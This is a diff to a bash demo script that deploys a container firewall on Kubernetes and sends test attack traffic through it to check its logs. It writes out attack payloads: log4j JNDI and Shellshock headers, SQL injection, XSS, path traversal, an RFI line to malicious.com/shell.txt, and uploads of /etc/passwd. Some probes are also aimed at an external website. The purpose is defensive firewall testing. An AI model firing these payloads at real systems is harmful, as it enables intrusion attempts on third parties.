@@ -1,5 +1,25 @@
 #!/bin/bash  -e
 
+
+function cleancfoslog() {
+  local logfiles=("${@:1:$#-2}") # Capture all but the last two arguments as log files
+  local label="${@:$#-1:1}"      # Second-to-last argument
+  local number="${@:$#:1}"       # Last argument
+  label="${label:-app=firewall}" # Apply default value if label is empty
+  number="${number:-1}"          # Apply default value if number is empty
+  local cfos_pod_name=$(kubectl get pods -l "$label" -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')
+
+  if [[ -n "$cfos_pod_name" ]]; then
+    for file in "${logfiles[@]}"; do
+runcli RED kubectl exec -it "po/${cfos_pod_name}" -c cfos -- sh -c ": > /var/log/log/$file"
+
+    done
+  else
+    echo "Error: No running pod found with label '$label'"
+  fi
+}
+
+
 function gke_network_policy_allow_default_security_namespace() {
 
 filename="allowdefaultnamespacetosecuirtynamespace.yaml" 
@@ -45,6 +65,9 @@ runcli GREEN gcloud container clusters get-credentials $clustername --zone $zone
 
 function demo_managedk8s() {
 
+runcli GREEN echo "start at $(date)" 
+
+
 local uluster_type=$1
 if [[ -z $cluster_type ]]; then 
 kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion' | grep -q "gke" && cluster_type="gke"
@@ -53,7 +76,6 @@ kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kernelVersion' | gr
 
 fi
 
-runcli GREEN echo $cluster_type
 
 case "$cluster_type" in
     "eks")
@@ -61,8 +83,6 @@ case "$cluster_type" in
     "aks")
      #create_aks_cluster "westus" "cfosdemowandy" || echo create_aks_cluster failed 
      add_label_to_node "kubernetes.io/os=linux" "security=true" "app=true" || echo command skipped 
-     #add_label_to_node "agentpool=ubuntu" "app=true" || exit 1
-     #add_label_to_node "agentpool=worker" "security=true" || exit 1
       ;;
     "gke")
      get_gkecluster_credentail my-first-cluster-1 us-central1-a 
@@ -79,7 +99,7 @@ applyCFOSLicense || exit 1
 deploy_cfos_with_agent "cfos7210250-deployment-new"  || exit 1
 
 
-updatecFOSsignuatre 
+#updatecFOSsignuatre 
 
 create_ingress_demo || echo create_ingress_demo exit
 
@@ -92,27 +112,79 @@ create_externallb_juiceshop $cluster_type
 
 runcli GREEN kubectl wait --for=jsonpath='{.status.loadBalancer.ingress[0].ip}' --timeout=5m service/cfosvipjuiceshopexternal
 
+runcli CYAN echo now update cFOS signiture and clean up old logs 
+
+updatecFOSsignuatre 
+
+log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
+cleancfoslog "${log_files[@]}" "app=firewall" 3
+
+
 #cfostestjuiceshop.westus.cloudapp.azure.com
 
 
-        log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
+#        log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
+#        check_cFOS_log "${log_files[@]}" "app=firewall" 1
+
+
+runcli CYAN echo "now running ingress security use case -ingress traffic from backend namespace to security namespace in same cluster (east-west use case )"  
+
+attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "normalfileupload" "segdownload" "eicarupload") 
+
+sendattack_to_headlesssvc_cfos "${attacktype[@]}"  
+
+        log_files=("traffic.0") 
         check_cFOS_log "${log_files[@]}" "app=firewall" 1
 
-sendattack_to_headlesssvc_cfos 
-send_traffic_to_lb "app=diag2" "backend" "ip" 
+        log_files=( "ips.0" ) 
 
-        log_files=("traffic.0" "ips.0" "virus.0" "app.0" )
-        check_cFOS_log "${log_files[@]}" "app=firewall" 10
+        check_cFOS_log "${log_files[@]}" "app=firewall" 5 
 
-#traffic directly to juiceshop svc is allowed and not protected. 
-sendattack_to_clusteripsvc "juiceshop-service" "security" || echo sendattack_to_clusteripsvc
+        log_files=( "virus.0" "app.0" )
+
+        check_cFOS_log "${log_files[@]}" "app=firewall" 2 
+
+runcli CYAN echo "now running ingress security use case -traffic destinated to both internal and exernal loadbalancer address which use cFOS VIP as backend" 
+
+
+        send_traffic_to_lb "app=diag2" "backend" "ip" "log4j" 
+        send_traffic_to_lb "app=diag2" "backend" "ip" "shellshock" 
+        send_traffic_to_lb "app=diag2" "backend" "ip" "xss"
+
+        log_files=("ips.0" )
+        check_cFOS_log "${log_files[@]}" "app=firewall" 9
+
+
+#traffic directly to juiceshop svc is allowed and not protected by ingress security but will be protected by egress security 
+
+runcli CYAN echo "now running egress security use case -egress traffic from one namespace to other namespace in same cluster (east-west use case )"
+
+attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection")  
+
+sendattack_to_clusteripsvc "juiceshop-service" "security" "${attacktype[@]}" || echo "sendattack_to_clusteripsvc failed"
+
 
  
-#egressse security
-send_waf_attack "app=diag2" "backend"  || echo send_waf_attack exit
+runcli CYAN echo now runnning egressse security use case -webfiltering 
+urllist=("https://www.fortiguard.com/wftest/26.html" "https://120.wap517.biz" "https://www.casino.org") 
+send_waf_attack "app=diag2" "backend" "${urllist[@]}" || echo send_waf_attack exit
 
 log_files=("webf.0")
 check_cFOS_log "${log_files[@]}" "app=firewall" 3
+
+runcli CYAN echo now runnning egressse security use case - malicious traffic to external website
+
+attacktype=("normal" "log4j" "shellshock")
+
+       for attack in "${attacktype[@]}" ; do
+          send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "https://www.hackthebox.com/"
+       done
+
+log_files=("ips.0")
+check_cFOS_log "${log_files[@]}" "app=firewall" 2
+
+ 
+runcli GREEN echo stop at $(date)  
 
 }
 
@@ -171,25 +243,19 @@ function send_traffic_to_lb() {
 local podlabel="${1:-app=diag2}"
 local podnamespace="${2:-backend}"
 local ingresstype="${3:-hostname}"
+local attack="${4:-normal}"
 internalslbname=$(kubectl get svc cfosvipjuiceshopinternal -o json | jq -r .status.loadBalancer.ingress[].$ingresstype)
 externalslbname=$(kubectl get svc cfosvipjuiceshopexternal -o json | jq -r .status.loadBalancer.ingress[].$ingresstype)
 podname=$(kubectl get pod -l $podlabel -n $podnamespace -o json  | jq -r .items[0].metadata.name)
-echo sending via internal lb
-echo $podname
-echo sending kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 http://$internalslbname:3000
-runcli GREEN kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 http://${internalslbname}:3000 || echo failed 
-echo sending kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://${internalslbname}:3000
-runcli GREEN kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://${internalslbname}:3000 || echo failed 
 
-echo sending via external lb
-echo sending kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 http://$externalslbname:3000
-runcli GREEN kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 http://$externalslbname:3000 || echo failed 
-echo sending kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://$externalslbname:3000
-runcli GREEN kubectl exec -it po/$podname -n backend -- curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://$externalslbname:3000 || echo failed 
-echo access from internet
-echo curl -I --max-time 5 -H "User-Agent: curl" http://$externalslbname:3000 || echo 
-runcli GREEN curl -I --max-time 5 -H "User-Agent: curl" http://$externalslbname:3000 || echo 
-echo curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://$externalslbname:3000 || echo blocked
+
+send_attack_traffic $podlabel $podnamespace 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "http://${internalslbname}:3000"
+
+send_attack_traffic $podlabel $podnamespace 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "http://${externalslbname}:3000"
+
+
+runcli GREEN echo send traffic  from internet address
+
 runcli GREEN curl -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls" http://$externalslbname:3000 || echo blocked
 } 
 
@@ -210,45 +276,40 @@ function create_ingress_demo() {
 function send_waf_attack() {
 local podlabel="${1:-app=diag2}"
 local podnamespace="${2:-backend}"
+local urllist=("${@:3}")
 
-webftestegress  $podlabel $podnamespace 'https://www.fortiguard.com/wftest/26.html'         
-webftestegress  $podlabel $podnamespace  'https://120.wap517.biz'
-webftestegress  $podlabel $podnamespace  'https://www.casino.org'
+for url in "${urllist[@]}"; do 
+webftestegress  $podlabel $podnamespace $url 
+done
+
+#urllist=("https://www.fortiguard.com/wftest/26.html" "https://120.wap517.biz" "https://www.casino.org")
 
 }
 
 
 function sendattack_to_clusteripsvc() {
 
-    targetsvcname="${1:-juiceshop-service}"
-    targetnamespace="${2:-security}"
-    # Loop through attack types and send attack traffic
-    for attack in "normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "directory_travers
-al" "normalfileupload" "segdownload"; do
+    local targetsvcname="${1:-juiceshop-service}"
+    local targetnamespace="${2:-security}"
+    local attack_types=("${@:3}")  
 
-   # echo ✅   sending attack traffic with label 'app=diag2' in namespace 'backend' to ${targetsvcname} in namespace ${targetnamespace} with payload "$attack"
-   send_attack_traffic 'app=diag2' 'backend' "$targetsvcname" "$targetnamespace" "$attack" "ips.0" || echo failed to send traffic 
+    for attack in "${attack_types[@]}"; do
+        if [ "$attack" = "eicarupload" ]; then
+            send_attack_traffic 'app=diag2' 'backend' "$targetsvcname" "$targetnamespace" "$attack" "virus.0"  || exit 1
+        else
+            send_attack_traffic 'app=diag2' 'backend' "$targetsvcname" "$targetnamespace" "$attack" "ips.0"  || echo "failed to send traffic"
+        fi
     done
-
-    # Handle the exception for "eicarupload"
-    send_attack_traffic 'app=diag2' 'backend' ${targetsvcname} ${targetnamespace} "eicarupload" "virus.0" || exit 1
 
 } 
 
+
 function sendattack_to_headlesssvc_cfos() {
-for attack in "normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" ; do
-    #echo  ✅  send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" 
+   local attack_types=("$@") 
+   for attack in "${attack_types[@]}"; do 
     send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" || exit 1
 done
 
-for attack in  "normalfileupload" "segdownload"; do
-    #echo  ✅  send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" 
-    send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" || exit 1
-done
-for attack in "eicarupload"; do
-    #echo  ✅  send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" 
-    send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" || exit 1
-done
 }
 
 function create_aks_cluster() {
@@ -328,6 +389,8 @@ function deploy_cfos() {
 
 deploymentname="cfos7210250-deployment-new"
 
+#--set nodeSelector=null to disable select node based on label 
+
 kube_dns_ip=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}')
 helm repo add cfos-chart https://yagosys.github.io/cfos-chart
 helm repo update
@@ -376,7 +439,6 @@ kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion' | g
 kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kernelVersion' | grep -q "azure" && cluster_type="aks"
 
 fi 
-runcli GREEN echo cluster_type is $cluster_type 
 
   case "$cluster_type" in
     "eks")
@@ -452,7 +514,6 @@ kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion' | g
 kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kernelVersion' | grep -q "azure" && cluster_type="aks"
 
 fi
-runcli GREEN echo cluster_type is $cluster_type 
 
   case "$cluster_type" in
     "eks")
@@ -657,16 +718,16 @@ function webftestegress() {
 	 local pod_namespace="${2:-default}"
 	 local url="${3:-https://www.fortiguard.com/wftest/26.html}"
 
-	 echo $pod_namespace
-	 echo $pod_label_selector 
-	 echo kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}'
+	 #echo $pod_namespace
+	 #echo $pod_label_selector 
+	 #echo kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}'
 	 POD_NAME=$(kubectl get pods -n "$pod_namespace" -l "$pod_label_selector" --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
 
     if [ -z "$POD_NAME" ]; then
         echo "No pod found with label '$pod_label_selector' in namespace '$pod_namespace'" && exit 1
     fi
-	echo kubectl exec -it "$POD_NAME" -n $pod_namespace -- curl -k $url
-	kubectl exec -it "$POD_NAME" -n $pod_namespace -- curl -k $url || echo failed to run
+	#echo kubectl exec -it "$POD_NAME" -n $pod_namespace -- curl -k $url
+	runcli GREEN kubectl exec -it "$POD_NAME" -n $pod_namespace -- curl -I -k $url || echo failed to run
 }
 
 
@@ -1260,63 +1321,67 @@ function test_diag2() {
     target_svc_namespace="${4:-security}"
     payload_type="${5:-normal}"
     logfile_name="${6:-traffic.0}"
+    local service_address="${7}" 
 
     # Define the Juice Shop service address in a variable using parameters
-    local service_address="http://${target_svc_name}.${target_svc_namespace}.svc.cluster.local:3000/"
+    if [[ -z $service_address ]] ; then 
+     service_address="http://${target_svc_name}.${target_svc_namespace}.svc.cluster.local:3000/"
+    fi 
+
     local cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[?(@.status.phase=="Running")].metadata.name}')
 
 
     case "$payload_type" in
     normal)
-        local payload='curl -s -I --max-time 5'
+        local payload='curl -s -I -k --max-time 5'
         local logfile_name="traffic.0"
         ;;
     log4j)
-        local payload='curl -s -I --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
+        local payload='curl -s -I -k --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
         local logfile_name="ips.0"
         ;;
     shellshock)
-        local payload='curl -s -I --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+        local payload='curl -s -I -k --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
         local logfile_name="ips.0"
         ;;
     sql_injection)
-        local payload='curl -s --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
+        local payload='curl -s -k --max-time 5 --data "username=admin&password= OR 1=1 -- -"'
         local logfile_name="ips.0"
         ;;
     normalfileupload)
-        local payload='curl  --max-time 5 -v -F "file=@/etc/passwd"'
+        local payload='curl  -k --max-time 5 -v -F "file=@/etc/passwd"'
         local logfile_name="app.0"
         ;;
     segdownload)
-	local payload='curl -v -r 250000-499999'
+	local payload='curl -v -k  -r 250000-499999'
 	local logfile_name="app.0"
 	;;
     xss)
-        local payload='curl -s --max-time 5 --data "search=<script>alert(1)</script>"'
+        local payload='curl -s -k --max-time 5 --data "search=<script>alert(1)</script>"'
         local logfile_name="ips.0"
         ;;
     lfi)
-        local payload='curl -s -I --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
+        local payload='curl -s -k -I --max-time 5 "http://target.com/index.php?page=../../../../etc/passwd"'
         local logfile_name="ips.0"
         ;;
     rfi)
-        local payload='curl -s -I --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
+        local payload='curl -s -k -I --max-time 5 "http://target.com/index.php?page=http://malicious.com/shell.txt"'
         local logfile_name="ips.0"
         ;;
     cmd_injection)
-        local payload='curl -s -I --max-time 5 --data "input=1; cat /etc/passwd"'
+        local payload='curl -s -k -I --max-time 5 --data "input=1; cat /etc/passwd"'
         local logfile_name="ips.0"
         ;;
     directory_traversal)
-        local payload='curl -s -I --max-time 5 "http://target.com/../../../../etc/passwd"'
+        local payload='curl -s -k -I --max-time 5 "http://target.com/../../../../etc/passwd"'
         local logfile_name="ips.0"
         ;;
     user_agent_malware)
-        local payload='curl -s -I --max-time 5 -H "User-Agent: BlackSun"'
+        local payload='curl -s -k -I --max-time 5 -H "User-Agent: BlackSun"'
         local logfile_name="ips.0"
         ;;
     eicardownload)
-	local payload='curl -s -k -O https://secure.eicar.org/eicar.com.txt'
+	local payload='curl -s -k -k -O https://secure.eicar.org/eicar.com.txt'
         local logfile_name="virus.0"
         ;;
     eicardownload1)
@@ -1326,15 +1391,15 @@ function test_diag2() {
     eicarupload)
         curl -k -O https://secure.eicar.org/eicar_com.zip 
 	kubectl cp eicar_com.zip $(kubectl get pods -l app=diag2 -n backend -o jsonpath='{.items[0].metadata.name}'):/tmp/eicar_com.zip -n backend
-        local payload='curl -v -F "file=@/tmp/eicar_com.zip"'
+        local payload='curl -v -k -F "file=@/tmp/eicar_com.zip"'
         local logfile_name="virus.0"
         ;;
     trojan)
-        local payload='curl -s -I --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9dHJvamFuX3NpZ25hdHVyZQ==' | base64 -d)"'
+        local payload='curl -s -I -k --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9dHJvamFuX3NpZ25hdHVyZQ==' | base64 -d)"'
         local logfile_name="virus.0"
         ;;
     worm)
-        local payload='curl -s -I --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9d29ybV9zaWduYXR1cmU=' | base64 -d)"'
+        local payload='curl -s -I -k --max-time 5 --data "$(echo 'bWFsaWNpb3VzX2NvZGU9d29ybV9zaWduYXR1cmU=' | base64 -d)"'
         local logfile_name="virus.0"
         ;;
      cve1)
@@ -1343,7 +1408,7 @@ function test_diag2() {
         local logfile_name="ips.0"
         ;;
     *)
-        local payload='curl -s -I --max-time 5'
+        local payload='curl -s -I -k --max-time 5'
         local logfile_name="ips.0"
         ;;
 esac
@@ -2593,6 +2658,7 @@ echo "createcFOSlicensefile- create cFOS licenseconfigmap file from .lic file"
 echo "deploycFOSwithAgent  - Deploy CFOS and vxlan agent with helm chart"
 echo "createIngressDemo    - createIngressDemo for juiceshop"
 echo "sendAttacktocFOSSVC  - send attack to cFOSheadlesssvc for ingress security test" 
+echo "sendAttackToExternal - send attack to external website"
 echo "sendWebftoExternal   - send webf to external for egress security test"
 echo "sendAttackToClusterIP- send attack traffic to clusterip svc for egress security test"
 echo "createSLB            - createinternalslbforjuiceshop and send ips traffic"  
@@ -2653,13 +2719,28 @@ case "$1" in
         create_ingress_demo || echo create_ingress_demo exit
 	;;
     sendAttacktocFOSSVC)
-       sendattack_to_headlesssvc_cfos
+        attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "normalfileupload" "segdownload" "eicarupload") 
+       sendattack_to_headlesssvc_cfos "${attacktype[@]}" 
+
         ;;
     sendWebftoExternal)
-       send_waf_attack "app=diag2" "backend"  || echo send_waf_attack exit
+       urllist=("https://www.fortiguard.com/wftest/26.html" "https://120.wap517.biz" "https://www.casino.org") 
+       send_waf_attack "app=diag2" "backend" "${urllist[@]}" || echo send_waf_attack exit
         ;;
+
+    sendAttackToExternal)
+      
+       attacktype=("normal" "log4j" "shellshock")
+
+       for attack in "${attacktype[@]}" ; do 
+          send_attack_traffic 'app=diag2' 'backend' 'cfostest-vip-juiceshop' 'default' $attack "ips.0" "https://www.hackthebox.com/"
+       done
+
+       ;;
+
     sendAttackToClusterIP)
-       sendattack_to_clusteripsvc "juiceshop-service" "security" || echo sendattack_to_clusteripsvc
+       attacktype=("normal" "log4j" "shellshock" "xss" "user_agent_malware" "sql_injection" "normalfileupload" "segdownload" "eicarupload") 
+       sendattack_to_clusteripsvc "juiceshop-service" "security" "${attacktype[@]}" || echo sendattack_to_clusteripsvc
         ;;
     createSLB)
         create_internallb_juiceshop_new 
@@ -2668,13 +2749,19 @@ case "$1" in
         #cfostestjuiceshop.westus.cloudapp.azure.com  
         ;; 
     sendTrafficToLB)
-        send_traffic_to_lb "app=diag2" "backend" "ip"
+        send_traffic_to_lb "app=diag2" "backend" "ip" "log4j"
+        send_traffic_to_lb "app=diag2" "backend" "ip" "shellshock"
+        send_traffic_to_lb "app=diag2" "backend" "ip" "xss"
         ;;
     checkCFOSLog)
 
         log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
         check_cFOS_log "${log_files[@]}" "app=firewall" 3
+        ;; 
+     cleanCFOSLog)  
 
+       log_files=("traffic.0" "ips.0" "virus.0" "app.0" "webf.0")
+       cleancfoslog "${log_files[@]}" "app=firewall" 3  
         ;; 
     deleteCFOSandAgent)
        deleteCFOSandAgent "cfos7210250-deployment-new" 
